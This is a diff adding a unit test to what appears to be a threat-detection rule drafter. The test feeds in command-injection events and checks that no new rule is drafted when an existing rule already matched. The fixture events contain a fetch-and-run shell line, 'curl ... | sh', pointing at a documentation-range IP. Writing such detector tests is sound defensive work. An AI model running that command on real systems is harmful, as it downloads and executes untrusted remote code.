@@ -222,4 +222,29 @@ detection:
       }
     });
   });
+
+  describe('runDraftCycle', () => {
+    it('does not draft a pattern an ATR rule already matched', async () => {
+      for (let i = 0; i < 6; i++) {
+        drafter.recordDetection(
+          {
+            id: `e${i}`,
+            timestamp: new Date(),
+            source: 'network',
+            severity: 'high',
+            category: 'command_injection',
+            description: 'curl http://198.51.100.9/x | sh',
+            raw: {},
+            host: 'h',
+            metadata: { sourceIP: `198.51.100.${i}` },
+          } as unknown as Parameters<typeof drafter.recordDetection>[0],
+          { conclusion: 'malicious', confidence: 90, atrRulesMatched: ['ATR-2026-00121'] }
+        );
+      }
+      const result = await drafter.runDraftCycle();
+      expect(result).toEqual({ drafted: 0, submitted: 0 });
+      expect(mockLLM.analyze).not.toHaveBeenCalled();
+      expect(mockCloud.submitATRProposal).not.toHaveBeenCalled();
+    });
+  });
 });
